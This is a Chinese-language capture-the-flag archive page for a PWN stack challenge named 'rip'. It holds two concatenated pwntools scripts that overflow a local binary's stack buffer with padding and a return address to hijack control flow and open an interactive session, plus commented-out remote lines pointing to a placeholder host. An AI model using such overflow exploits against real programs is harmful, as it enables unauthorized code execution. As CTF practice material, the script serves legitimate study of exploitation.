# 知识点

Stack

# 题目分析

分类：PWN / Stack。

本页按现有附件、脚本和分析记录归档；运行与解题状态见具体记录，整理过程未执行题目或远端脚本。

## 文件

- [rip](rip)
- [rip.py](rip.py)

尚无可匹配的题解正文，当前保留附件及已有脚本，分析结论待补。

# EXP

- [rip.py](rip.py)

脚本按已有材料保留，使用前核对目标程序、运行库和参数。公开副本中的历史服务地址已替换，需自行设置。

```python
from pwn import*
elf=ELF("./rip")
context=amd64
io=process('./rip')
#host = "
p=0xf+0x8
#ip = "127.0.0.1"

#io = remote("challenge.example.invalid", 9999, ssl=True, sni="challenge.example.invalid")
#io=remote("challenge.example.invalid", 9999, ssl=True, sni="challenge.example.invalid")
bin=0x0000040118b
padding=b'a'*p+p64(bin)
io.sendline(padding)
io.interactive()

from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

p = process('./rip')

offset = 23
ret_gadget = 0x401016
fun_start = 0x401186

payload = b'A' * offset
payload += p64(ret_gadget)
payload += p64(fun_start)

p.sendline(payload)
p.interactive()
```
